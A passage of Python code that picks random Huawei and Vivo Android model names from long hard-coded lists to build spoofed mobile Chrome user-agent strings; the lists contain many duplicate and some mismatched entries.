'GOT-AL09', 'GOT-AL09', 'GOT-W29', 'GOT-W29', 'AGS3-L09', 'HUAWEI MediaPad', 'HUAWEI MediaPad', '403HW', 'HUAWEI MediaPad', 'S8-306L', 'HUAWEI MediaPad', 'Huawei MediaPad', 'X1 7.0', 'Huawei MediaPad', 'S8-701w', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MON-AL19B', 'MON-AL19B', 'MON-AL19B', 'BTV-DL09', 'BTV-W09', 'BAH-W09', 'CPN-L09', 'CPN-AL00', 'CPN-W09', 'BAH-L09', 'BAH2-W19', 'JDN2-L09', 'BAH2-L09', 'BAH2-AL10', 'AGR-L09', 'KOB2-L03', 'T1-A21w', 'T1-A21L', 'T1-A23L', 'T1-701u', 'T1-701u', 'T1-823L', 'T1-823L', 'T1-821w', 'MediaPad T1 8.0', 'AGS-W09', 'AGS-L09', 'AGS-L03', 'BG2-U01', 'BG2-W09', 'KOB-L09', 'BZK-L00', 'KOB-W09', 'AGS2-L09', 'AGS2-W09', 'GEM-701L', 'GEM-703L', 'GEM-702L', 'Nexus 6P', 'Nexus 6P', 'HUAWEI CAN-L11', 'HUAWEI CAN-L12', 'HUAWEI CAN-L01', 'HUAWEI CAZ-AL10', '1080x1788', 'NCO-LX1', 'NCO-AL00', 'GLA-LX1', 'GLA-AL00', 'PIC-TL00', 'PIC-LX9', 'PIC-AL00', '704HW', 'BAC-L03', 'BAC-TL00', 'BAC-L01', 'BAC-TL00', 'BAC-AL00', 'BAC-L22', 'BAC-L21', 'BAC-AL00', 'BAC-L21', 'RNE-L22', 'HWI-AL00', 'HWI-AL00', 'HWI-AL00', 'HWI-TL00', 'HWI-AL00', 'PAR-LX1', 'PAR-AL00', 'PAR-LX9', 'PAR-AL00', 'ANE-AL00', 'INE-LX2', 'INE-LX2r', 'VCE-L22', 'VCE-TL00', 'VCE-AL00', 'VCE-AL00', 'VCE-AL00', 'MAR-AL00', 'MAR-AL00', 'MAR-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL10', 'SEA-AL10', 'SEA-AL10', 'SEA-AL10', 'SEA-AL10', 'GLK-AL00', 'GLK-TL00', 'GLK-TL00', 'GLK-LX1U', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'SPN-TL00', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'JNY-AL10', 'JNY-AL10', 'JNY-AL10', 'JNY-AL10', 'JNY-AL10', 'JEF-TN00', 'JEF-NX9', 'JEF-AN20', 'JEF-AN00', 'JEF-AN20', 'JEF-AN00', 'JER-AN20', 'JER-AN10', 'JER-TN10', 'JER-AN10', 'JER-AN10', 'JER-AN20', 'JER-AN10', 'CDL-AN50', 'CDY-NX9B', 'CDY-AN00', 'CDY-AN00', 'JNY-LX2', 'ANG-LX2', 'ANG-LX1', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AN00', 'BRQ-AN00', 'BRQ-AN00', 'BRQ-AN00', 'BRQ-AN00', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'CHL-AL60', 'CHL-AL60', 'NEN-LX1', 'NEN-L22', 'NAM-LX9', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'JLN-LX1', 'JLN-LX3', '608HW', 'PRA-LX2', 'PRA-LX3', 'HUAWEI MLA-L11', 'DIG-L01', 'WAS-AL00', 'FIG-LX1', 'FIG-LX2', 'FIG-LX3', 'POT-LX1', 'POT-LX3', 'POT-LX2J', 'POT-LX1AF', 'POT-LX1T', 'PPA-LX2', 'PPA-LX1', 'P Smart S', 'STK-LX1', 'MZ-STK-LX1', 'VTR-L09', 'VTR-L29', 'VTR-AL00', 'WAS-LX1A', 'WAS-TL10', 'VKY-AL00', 'VKY-L09', 'VKY-L29', 'BAC-L23', 'HUAWEI P11', 'EML-L09', 'EML-L29', 'EML-AL00', 'EML-AL00', 'EML-L29', 'ANE-LX1', 'ANE-LX2', 'ANE-LX3', 'ANE-LX2J', 'CLT-L29', 'CLT-AL00', 'CLT-L09', 'CLT-L04', 'CLT-AL00', 'ELE-AL00', 'ELE-L09', 'ELE-AL00', 'ELE-L29', 'ELE-L04', 'ELE-AL00', 'MAR-LX1A', 'MAR-LX1M', 'MAR-LX1A', 'MAR-LX2', 'MAR-LX3A', 'MAR-LX1B', 'VOG-AL10', 'VOG-L29', 'VOG-L09', 'HUAWEI P30PRO', 'ANA-LX4', 'JNY-LX1', 'ART-L29', 'ART-L29N', 'ELS-NX9', 'ELS-AN00', 'ELS-AN00', 'ELS-AN00', 'ELS-AN10', 'ELS-AN10', 'ELS-N39', 'ELS-AN10', 'ABR-LX9', 'ABR-AL00', 'Huawei P50', 'ABR-AL00', 'BAL-L49', 'BAL-AL00', 'JAD-AL50', 'ABR-AL60', 'ABR-AL90', 'ABR-AL60', 'ABR-AL90', 'ABR-AL60', 'ABR-AL90', 'ABR-AL60', 'ABR-AL60', 'ABR-AL60', 'HUAWEI P6-U06', 'HUAWEI P6s', 'HUAWEI P7 mini', 'HUAWEI P7 mini', 'HUAWEI P7 mini', 'HUAWEI GRA-L09', 'HUAWEI GRA-UL00', 'ALE-L21', 'ALE-L23', 'ALE-L21', 'ALE-L21', 'PRA-LX1', 'PRA-LA1', 'HUAWEI P8max', 'HUAWEI GRA-UL10', 'HUAWEI-P8Lite', 'HUAWEI-P8Lite', 'EVA-L09', 'EVA-DL00', 'EVA-L19', 'EVA-AL00', 'EVA-AL10', 'HUAWEI VNS-L31', 'HUAWEI VNS-L21', 'HUAWEI VNS-L22', 'SLA-L22', 'SLA-L02', 'HUAWEI VNS-L52', 'HUAWEI VNS-L52', 'DIG-L03', 'DIG-L23', 'VIE-L29', 'VIE-L09', 'VIE-AL10', 'VIE-AL10', 'SM-A336B', 'SM-A536E', 'M2101K6R', 'SM-A307G', 'SM-A528B', 'LM-K200', '2201116SG', 'SM-A107M', 'CPH2239', 'SM-A205G', 'M2004J19C', 'M2102J20SG', 'SM-A336M', 'SM-A127M', 'SM-G975U', 'SM-A730F', 'SM-G950F', 'M2007J20CG', 'T671E', 'HUAWEI_Q201', 'Huawei S7', 'HUAWEI-S7', 'HUAWEI-S7', 'HUAWEI-S7', 'S8600', 'S8600', 'S8600', 'HUAWEI S9', 'HUAWEI ATH-UL01', 'HUAWEI ATH-UL06', 'KANT-360', 'KANT-360S', 'LEO-BX9', 'LEO-DLXXE', 'HUAWEI T1 7.0', 'B988', 'ZT-10013G', 'B988', 'B988', 'HUAWEI T8100', 'HUAWEI T8500', 'HUAWEI T8600', 'T8620', 'T8620', 'T8620', 'T8830Pro', 'T8830Pro', 'T8830Pro', 'HUAWEI T8833', 'HUAWEI T8833', 'HUAWEI T8833', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8951', 'HUAWEI T8951', 'HUAWEI T8951', 'HUAWEI_T8951', 'HUAWEI_T8951', 'HUAWEI T8951', 'HUAWEI T8951', 'T9200', 'T9200', 'T9200', 'HUAWEI-U20', 'HUAWEI U8120', 'U8180', 'U8180', 'U8180', 'MegaFon U8180', 'Kyivstar Terra', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8230', 'U8220/U8230', 'HuaweiU8300', 'U8350', 'U8350', 'GM FOX', 'U8350', 'Barcelona', 'U8350', 'U8350', 'U8350', 'U8350', 'U8350-51', 'U8350', 'U8350', 'U8350', 'U8350-51', 'Personal U8350', 'U8350', 'U8350', 'U8350', 'U8350', 'MF8503', 'ICE', 'MF8503', 'MF8503', 'HuaweiU8500', 'HuaweiU8510', 'S41HW', 'U8600', 'U8600', 'U8600', 'U8600', 'U8600', 'U8600', 'U8600', 'Huawei u8650', 'Huawei u8650', 'U8650', 'U8650-1', 'U8650', 'U8650', 'U8650', 'U8650-1', 'U8650-1', 'U8650', 'MTC 955', 'U8650', 'U8650', 'U8650-1', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'Prism', 'Prism', 'Prism', 'U8651T', 'Prism', 'U8651T', 'U8651T', 'Prism', 'U8652', 'Huawei-U8652', 'U8652', 'Huawei-U8652', 'Huawei-U8652', 'Huawei-U8652', 'Huawei-U8652', 'Android 2.3.5', 'U8655-51', 'U8655-1', 'U8655-1', 'U8655-1', 'MTC 965', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'Etisalat', 'U8655-1', 'U8655-1', 'U8655-51', 'U8655-1', 'U8660', 'SONIC', 'HUAWEI U8661', 'HUAWEI_U8661', 'HUAWEI U8661', 'HUAWEI U8661', 'HUAWEI U8661', 'HUAWEI U8661', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'GT-19100', 'U8666-1', 'U8666-1', 'U8666-1', 'MTC Fit', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-51', 'U8666-1', 'U8666-51', 'U8666-51', 'U8666-51', 'U8666-51', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666N', 'HUAWEI U8666N', 'HUAWEI U8666N', 'HUAWEI U8666N', 'HUAWEI U8666N', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'T-MobilemyTouch', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'Prism II', 'Prism II', 'Prism II', 'Prism II', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Ucell', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8815-51', 'U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'Galaxy S5', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'MTC Viva', 'HUAWEI U8816', 'U8816', 'MTC Viva', 'U8816', 'U8816', 'U8820', 'U8820', 'U8820', 'U8820', 'U8820', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI_U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI_U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'U8832D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'HUAWEI-U8850', 'U8860-51', 'HUAWEI_U8860', 'U8867Z', 'U8867Z', 'U8867Z', 'Huawei U8900', 'HUAWEI U8950', 'HUAWEI U8950D', 'Oppo F9D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8951', 'Huawei-U9000', 'HUAWEI-U9000', 'HUAWEI-U9000', 'HUAWEI-U9000', 'U9200E', 'U9200E', 'U9200E', 'U9200E', 'U9200E', 'U9200E', '201HW', '201HW', '201HW', '201HW', 'U9500E', 'HW-01E', 'HW-01E', 'HW-01E', 'HW-01E', 'HUAWEI U9510', 'Huawei/U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI_U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'GL07S', 'GL07S', 'GL07S', 'GL07S', 'GL07S', 'GL07S', 'UM840', 'UM840', 'UM840', 'KANT-359', 'KANT-369', 'HUAWEI WATCH', 'ARS-L22', 'ARS-TL00', 'ARS-AL00', 'ARS-L22', 'Huawei Y221', 'Huawei y221', 'Huawei Y3 2017', 'CRO-U00', 'CRO-L22', 'CAG-L02', 'CAG-L22', 'HUAWEI Y300C', 'HUAWEI Y300C', 'HUAWEI_Y300C', 'HUAWEI Y300C', 'HUAWEI Y300C', 'HUAWEI Y300C', 'HUAWEI Y300C', 'Huawei Y301A1', 'Huawei Y301A1', 'Huawei Y301A1', 'Huawei Y301A1', 'Huawei Y301A2', 'Huawei Y301A2', 'Huawei Y301A2', 'HuaweiY301A2', 'Huawei Y320', 'Huawei Y320', 'Huawei Y320', 'Huawei Y330', 'Huawei Y330', 'HUAWEI Y330-U01', 'HUAWEI Y336-U02', 'Huawei Y360', 'HUAWEI Y360', 'HUAWEI LUA-L21', 'HUAWEI LUA-U22', 'MYA-L22', 'MYA-L23', 'MYA-U29', 'DRA-L21', 'DRA-LX3', 'DRA-L01', 'U', 'AMN-LX9', 'AMN-LX2', 'AMN-LX3', 'HUAWEI AMN-LX9', 'AMN-LX1', 'DRA-LX5', 'DRA-LX5', 'DRA-LX5', 'DRA-LX5', 'CRO-L23', 'CRO-L03', 'CRO-L03', 'CAG-L03', 'CAG-L23', 'DRA-LX2', 'MYA-L13', 'HUAWEI Y511', 'Huawei Y520', 'HUAWEI Y520', 'HUAWEI Y536A1', 'HUAWEI Y550', 'HUAWEIY560', 'Huawei Y5C', 'HUAWEI CUN-L22', 'HUAWEI CUN-U29', 'HUAWEI CUN-L21', 'HUAWEI CUN-L01', 'DRA-LX9', 'DRA-LX9', 'DRA-LX9', 'HUAWEI SCL-U31', 'HUAWEI SCC-U21', 'MYA-L11', 'MYA-L41', 'ATU-L22', 'ATU-L21', 'MRD-LX3', 'MRD-LX1', 'MRD-LX1F', 'MRD-LX1N', 'MRD-LX3', 'ATU-L31', 'TIT-L01', 'HUAWEI TIT-L01', 'HUAWEI TIT-AL00', 'MRD-LX2', 'Kavak Y625-U03', 'Y635-L03', 'Y635-L01', 'HUAWEI Y635-L03', 'Y635-L02', 'Y635-L21', 'Y635-L21', 'CAM-L21', 'HUAWEI CAM-L21', 'CAM-L23', 'CAM-L03', 'MED-LX9', 'MED-LX9N', 'H1711z', 'TRT-LX3', 'TRT-LX1', 'LDN-L01', 'LDN-LX3', 'LDN-L01', 'DUB-LX3', 'DUB-LX1', 'LDN-L21', 'LDN-L21', 'LDN-L21', 'TRT-L21A', 'LDN-LX2', 'DUB-LX2', 'DUB-AL20', 'PPA-LX3', 'Peppa-L23B', 'ART-L28', 'AQM-LX1', 'AQM-LX1', 'FLA-LX3', 'FLA-LX2', 'FLA-LX1', 'FLA-AL20', 'FLA-TL10', 'JKM-LX1', 'JKM-LX2', 'JKM-AL00b', 'JKM-AL00a', 'JKM-LX3', 'STK-L21', 'STK-L22', 'STK-LX3', 'FRL-L23', 'FRL-L22', 'FRL-L22'])
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Vivo" in str(self.device):
                self.android_model = random.choice(['vivo 1002T', 'Vivo 1605', 'vivo 1730', 'vivo 1809', 'vivo_1820', 'vivo 1835', 'vivo 1914', 'vivo 2010', 'vivo 2019', 'vivo 2019', 'vivo 2019', 'vivo 2023', 'vivo 2027', 'vivo 3969', 'VIVO 5', 'Vivo 6', 'Vivo 7 Pro', 'Vivo 8', 'Vivo 93K Prime', 'vivo A5 ', 'vivo a54', 'Vivo A54', 'vivo a57', 'Vivo A87', 'VIVO A94', 'VIVO AIR', 'VIVO C8818', 'vivo E1', 'vivo E3', 'vivo E3', 'vivo E5', 'Vivo EGO', 'V1962BA', 'vivo h5', 'V1824A', 'V1824A', 'V1824BA', 'V2217A', 'V2217A', 'V2218A', 'V2218A', 'V2218A', 'V2243A', 'V1955A', 'I1927', 'I1928', 'V2024A', 'V2025A', 'V2025A', 'V2049A', 'V2049A', 'I2009', 'I2012', 'I2012', 'V2136A', 'V2136A', 'V2141A', 'V2171A', 'I2017', 'V2172A', 'V2172A', 'I2022', 'I2019', 'I2019', 'I2201', 'V1914A', 'V1914A', 'V1981A', 'V2055A', 'V2118A', 'V2157A', 'V2157A', 'V2154A', 'V2196A', 'V2196A', 'V2199A', 'V2231A', 'V2238A', 'V1936AL', 'V1936A', 'V1922A', 'V1922A', 'V1922A ', 'V1916A', 'V2023A', 'V2023A', 'VIVO V2023A', 'V2065A', 'V2061A', 'V2061A', 'V2143A', 'V2106A', 'V2165A', 'V2165A', 'V2180GA', 'V1986A', 'V2012A', 'V2012A', 'V2073A', 'V2073A', 'I2011', 'V2148A', 'I2018', 'V1919A', 'V2131A', 'V2220A', 'I2202', 'I2206', 'I2203', 'I2202', 'I2127', 'I2202', 'I2208', 'I2208', 'I2126', 'I2126', 'I2126', 'V2164KA', 'V2164KA', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'Vivo J5', 'vivo 1805', 'vivo 1805', 'vivo NEX', 'V1923A', 'vivo 1912', 'V1923A', 'vivo 1912', 'vivo 1913', 'V1924A', 'V1924A', 'vivo 1913', 'V1950A', 'V1950A', 'vivo NEX A', 'vivo NEX A', 'vivo 1813', 'V1821A', 'V1821A', 'vivo NEX S', 'vivo NEX S', 'Vivo ONE', 'Vivo ONE', 'PA2170', 'vivo PD1628F_EX', 'vivo PD1709', 'vivo PD1709F_EX', 'vivo PD1709F_EX', 'vivo PD1728', 'vivo PD1728', 'vivo PD1832F_EX', 'vivo PD2046F_EX', 'vivo PD2050F_EX', 'vivo PD2055F_EX', 'vivo PD2059F_EX', 'Vivo S', 'V1831A', 'V1831A', 'VIVO S1', 'Vivo S1 Prime', 'V1832A', 'V1832T', 'V2121A', 'V2121A', 'V2130A', 'V2130A', 'Vivo S11', 'Vivo S11 ', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S12', 'V2162A', 'Vivo S13', 'V2203A', 'V2207A', 'V2190A', 'V2244A', 'vivo S1Pro', 'Vivo S20 ', 'Vivo S21 ', 'Vivo S31', 'Vivo S4', 'Vivo S40', 'Vivo S41 /MMB439M', 'V1932A', 'vivo S6', 'V1962A', 'vivo S6T', 'V2020CA', 'V2020A', 'Vivo S76', 'V2031EA', 'vivo S7i(t)', 'vivo S7i(t)', 'vivo S7i(t)', 'V2080A', 'vivo S7t', 'vivo_S7t', 'vivo S7t', 'S7t 5G', 'vivo S7w', 'vivo S8', 'vivo S9', 'vivo S9', 'vivo S9', 'V2072A', 'V2048A', 'vivo S9t', 'V2168', 'V2168', 'V2153', 'V2153', 'V2150', 'V2151', 'V2151', 'V2151', 'V2143', 'vivo TD1602_EX', 'vivo U1', 'vivo 1916', 'vivo 1916', 'vivo 1921', 'V1941A', 'V1941A', 'V1928A', 'vivo V1', 'vivo V1', 'vivo V10', 'Vivo V10', 'VIVO V11', 'Vivo V11', 'vivo 1804', 'vivo 1804', 'vivo 1806', 'vivo 1806', 'vivo v11pro', 'vivo 1819', 'vivo 1818', 'vivo 1818', 'vivo 1920', 'vivo 1919', 'vivo 1907', 'vivo 1907', 'vivo 1907_19', 'vivo 1910', 'vivo 1909', 'vivo 1910', 'vivo 1933', 'vivo 1933', 'vivo V1907', 'vivo v19neo', 'vivo V1Max', 'vivo V1Max', 'vivo V2', 'V2040', 'vivo 2018', 'vivo 2018', 'V2022', 'Vivo V20A', 'Vivo V20G', 'V2066', 'V2108', 'V2050', 'V2050', 'V2050', 'V2061', 'V2055', 'Vivo V21S', 'V2130', 'V2132A', 'V2116', 'V2115', 'V2116', 'V2116', 'V2126', 'V2126', 'V2228', 'V2228', 'V2158', 'V2158', 'V2202', 'V2202', 'V2201', 'V2246', 'V2230', 'V2230', 'V2237', 'vivo V3', 'vivo V3', 'vivo V3Max A', 'vivo V3Max L', 'vivo v30', 'vivo v31', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3M A', 'vivo V3M A', 'vivo V3MA', 'vivo_V3Max', 'vivo v45', 'vivo 1601', 'vivo V5', 'vivo 1609', 'vivo 1611', 'Vivo V51', 'Vivo V54', 'vivo 1612', 'vivo 1713', 'vivo V5S A', 'vivo 1718', 'vivo 1716', 'vivo Y79A', 'vivo Y79A', 'V2166BA', 'Vivo V8', 'vivo 1723', 'vivo V9 mini', 'vivo 1851', 'VIVO V9Pro', 'vivo 1851', 'vivo 1727', 'Vivo X', 'V2178A', 'V2229A', 'V2170A', 'V2170A', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5S', 'vivo Xplay5S', 'vivo Xplay6', 'vivo Xplay6L', 'vivo Xplay6', 'vivo Xplay6', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X1', 'vivo X1', 'vivo X1', 'vivo X1', 'Vivo X11', 'vivo X1S', 'vivo X1S', 'vivo X1S', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1W', 'vivo X1w', 'VIVO X2', 'VIVO X2', 'VIVO_X2', 'vivo X20', 'vivo X20A', 'vivo X20Plus A', 'vivo 1720', 'vivo X20Plus UD', 'vivo X20Plus UD', 'vivo X21', 'vivo X21A', 'vivo X21UD A', 'vivo X21i', 'vivo X21i A', 'vivo X21i', 'vivo X21i A ', 'V1814A', 'V1814T', 'V1814T', 'V1814A', 'V1809A', 'V1809A', 'V1816A', 'V1809T', 'V1816T', 'V1829A', 'V1838A', 'V1838T', 'V1829T', 'V1836A', 'V1836A', 'V1836T', 'vivo X27Pro', 'V1938CT', 'V1938T', 'V1938T', 'vivo X3F', 'vivo X3F', 'vivo X3F', 'vivo X3L', 'vivo X3L', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'Vivo X40', 'vivo X5L', 'vivo X5', 'vivo X5L', 'vivo X5Pro D', 'vivo X5Pro L', 'vivo X5Pro V', 'vivo X5Pro D', 'vivo X5Pro D', 'V2001A', 'V2001A', 'vivo 2004', 'vivo 2005', 'vivo 2005', 'V1937', 'vivo 1937', 'V1937', 'V1937', 'vivo 2006', 'vivo 2006', 'V2005A', 'V2011A', 'X50 Pro+', 'V1930', 'V1930', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X520L', 'vivo X5F', 'vivo X5M', 'vivo X5M', 'vivo X5M', 'vivo X5Max ', 'vivo X5Max L', 'vivo X5Max L', 'vivo X5Max S', 'vivo X5Max V', 'vivo X5S L', 'vivo X5S L', 'vivo X5V', 'vivo X5V', 'vivo X5V', 'vivo X6D', 'vivo X6A', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus L', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus D', 'vivo X6Plus L', 'V2046A', 'V2059A', 'V2046A', 'V2045', 'V2046', 'V2047A', 'V2056A', 'V2085A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus A', 'vivo X7L', 'vivo X7Plus', 'vivo X7Plus', 'V2133A', 'V2104', 'V2104', 'V2105', 'V2134A', 'V2105', 'V2145A', 'V2114', 'V2145A', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'V2144', 'V2183A', 'V2144', 'V2208', 'V2185A', 'V2145', 'V2185A', 'Vivo X83', 'vivo X9', 'vivo X9L', 'vivo X9', 'vivo X9', 'vivo X9Plus', 'vivo X9Plus L', 'V2241A', 'V2242A', 'V2242A', 'V2227A', 'vivo X9i', 'vivo X9i', 'vivo X9i', 'vivo X9s', 'vivo X9s L', 'vivo X9s Plus', 'vivo X9s Plus', 'vivo X9s Plus L', 'vivo X9s Plus', 'VIVO XL', 'vivo Xplay', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'V2203', 'V2221', 'Vivo y1', 'Vivo Y1', 'V2168A', 'V2168A', 'vivo 1906', 'V2028', 'vivo Y11t', 'vivo Y11t', 'vivo Y11t', 'vivo 1904', 'V2163A', 'V2102', 'V2102', 'vivo 2007', 'vivo 2007', 'Vivo Y12I Pro', 'V2026', 'V2042', 'V2033', 'V2039', 'V2069', 'V2026_21', 'vivo Y13L', 'vivo Y13', 'vivo Y13L', 'vivo Y13L', 'vivo Y13i', 'vivo_Y13i', 'vivo Y13iL', 'vivo Y13iL', 'vivo Y13T', 'vivo Y13T', 'vivo 1901', 'vivo Y15T', 'vivo Y15T', 'V2134', 'V2147', 'V2147', 'V2212', 'V2120', 'V2204', 'V2214', 'V2204', 'vivo 1902', 'vivo 1902_19', 'VIVO 1902', 'vivo Y17T', 'vivo Y17T', 'vivo_Y17T', 'vivo Y17T', 'vivo Y17W', 'vivo Y17W', 'vivo Y17W', 'vivo Y18L', 'vivo Y18L', 'vivo Y18L', 'vivo 1915', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'Vivo Y1i', 'vivo 2015', 'vivo 2015', 'V2029', 'V2027', 'V2043_21', 'V2101', 'V2070', 'V2054', 'V2052', 'V2037', 'V2032', 'V2038', 'V2038', 'V2129', 'V2129', 'V2111', 'V2149', 'V2140', 'V2140', 'V2152', 'V2152', 'V2110', 'V2110', 'V2131', 'V2135', 'V2207', 'vivo Y22iL', 'vivo Y22iL', 'V2206', 'V2206', 'vivo Y23L', 'vivo Y23L', 'vivo y23l', 'vivo Y23L', 'vivo Y23L', 'vivo Y23L', 'vivo 1613', 'vivo Y27', 'vivo Y27L', 'vivo Y27', 'vivo Y28', 'vivo Y28', 'vivo Y28L', 'vivo Y28L', 'vivo Y29L', 'vivo Y29L', 'vivo Y29L', 'V1901A', 'V1901A', 'V1901A', 'V1901T', 'V1930A', 'vivo 1938', 'V2034A', 